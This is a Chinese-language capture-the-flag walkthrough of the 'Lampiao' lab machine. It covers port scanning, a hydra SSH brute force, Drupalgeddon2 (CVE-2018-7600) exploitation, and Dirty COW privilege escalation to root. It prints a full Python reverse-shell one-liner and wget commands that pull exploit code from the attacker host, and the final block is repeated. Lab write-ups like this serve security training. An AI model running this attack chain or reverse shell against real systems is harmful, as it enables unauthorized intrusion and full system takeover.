Lampiao：
1、nmap 10.211.55.9 -p-
目标计算机上有三个可用的开放端口22、80、1898端口

2、信息枚举：http://10.211.55.9:1898/ -> Read more 发现改页面信息：
http://10.211.55.9:1898/?q=node/2
页面发现：
audio.m4a：语音获得用户名：tiago
qrc.png：图片二维码扫描获得信息，需要爆破

3、爆破下网站目录
dirb http://10.211.55.9:1898
获得url：http://10.211.55.9:1898/robots.txt
继续枚举获得：http://10.211.55.9:1898/CHANGELOG.txt
发现是：Drupal 7.54, 2017-02-01

4、获取密码字典：cewl：通过爬行网站获取关键信息创建一个密码字典
cewl http://10.211.55.9:1898/?q=node/1 -w dayu.txt

5、hydra爆破
hydra -l tiago -P dayu.txt 10.211.55.9 ssh
先利用cewl来生成一份结合网站目标的社工性质的密码字典、不理解的可以搜索网上搜索cewl学习，然后九头蛇暴力破解得到用户密码：

[22][ssh] host: 10.211.55.9   login: tiago   password: Virgulino

用户: tiago
密码: Virgulino

6、登录ssh
ssh tiago@10.211.55.9
发现是低权限用户！需要提权！

7、提权

谷歌搜索：Drupal 7.54 exploit
#1063256 [CVE-2018-7600] Remote Code Execution due to ...

msfconsole
search  Drupal
set rport 1898
set rhosts 10.211.55.9

meterpreter > shell
python -c 'import pty; pty.spawn("/bin/bash")'

成功通过漏洞渗透进入系统，获得低权限用户，和前面ssh登陆的tiago用户权限类似，这是另外一种渗透的方法，可以好好学习。
下一步要找到反弹shell获取root权限，通过网上对Durpal 7版本2016年都可以使用dirty（脏牛）进行提权，非常有名的一个漏洞提权目前已经修复，仅供参考学习。

8、提权2
searchsploit dirty
使用：Linux Kernel 2.6.22 < 3.9 - 'Dirty COW /proc/self/mem' Race Condition Privile | linux/local/40847.cpp

cp /usr/share/exploitdb/exploits/linux/local/40847.cpp /root/桌面/
继续开启本地pthon服务，然后把40847.cp发送到靶机上：
python -m SimpleHTTPServer 8081

wget http://10.211.55.28:8081/40847.cpp

命令：g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dayu 40847.cpp -lutil

-Wall 一般使用该选项，允许发出GCC能够提供的所有有用的警告
-pedantic 允许发出ANSI/ISO C标准所列出的所有警告
-O2编译器的优化选项的4个级别，-O0表示没有优化,-O1为缺省值，-O3优化级别最高
-std=c++11就是用按C++2011标准来编译的
-pthread 在Linux中要用到多线程时，需要链接pthread库
-o dcow gcc生成的目标文件,名字为dcow
执行gcc编译可执行文件，可直接提权。

./40847

Root password is:   dirtyCowFun
获得root用户密码！

9、登录root-ssh

ssh root@10.211.55.9
root@lampiao:~# cat /root/flag.txt 
9740616875908d91ddcdaa8aea3af366

------------------------
拓展思路：
1、通过AWVS+xray跑出了poc：poc-yaml-drupal-cve-2018-7600-rce
那么Xray是给出了两篇poc的文章：
https://github.com/dreadlocked/Drupalgeddon2
https://paper.seebug.org/567/

通过文章查看，Drupalgeddon2有poc都是rb运行文件，下载！
https://github.com/dreadlocked/Drupalgeddon2
proxychains git clone https://github.com/dreadlocked/Drupalgeddon2.git

sudo gem install highline     --安装模块

安装完highline后即可执行：
./drupalgeddon2.rb http://10.211.55.9:1898/

通过poc发现对方是7.x的drupal版本漏洞，通过base64方法上传shell.php成功获得shell！

然后该shell是无法执行g++命令的，我将python进行反弹shell到本地nc交互：
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.211.55.28",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'


nc -vlp 6666
python -c 'import pty; pty.spawn("/bin/bash")'
cd /tmp
wget http://10.211.55.28:8081/40847.cpp
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o 40847 40847.cpp -lutil
./40847
获得root用户密码！

登录root-ssh：
ssh root@10.211.55.9
root@lampiao:~# cat /root/flag.txt 
9740616875908d91ddcdaa8aea3af366

----------------------------------------------------------------------
通过AWVS+xray跑出了poc：
https://github.com/dreadlocked/Drupalgeddon2
https://paper.seebug.org/567/
通过文章查看，Drupalgeddon2有poc都是rb运行文件，下载：
https://github.com/dreadlocked/Drupalgeddon2
proxychains git clone https://github.com/dreadlocked/Drupalgeddon2.git

sudo gem install highline
./drupalgeddon2.rb http://10.211.55.9:1898/
然后该shell是无法执行g++命令的，我将python进行反弹shell到本地nc交互：
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.211.55.28",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

nc -vlp 6666
python -c 'import pty; pty.spawn("/bin/bash")'
cd /tmp
wget http://10.211.55.28:8081/40847.cpp
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o 40847 40847.cpp -lutil
./40847







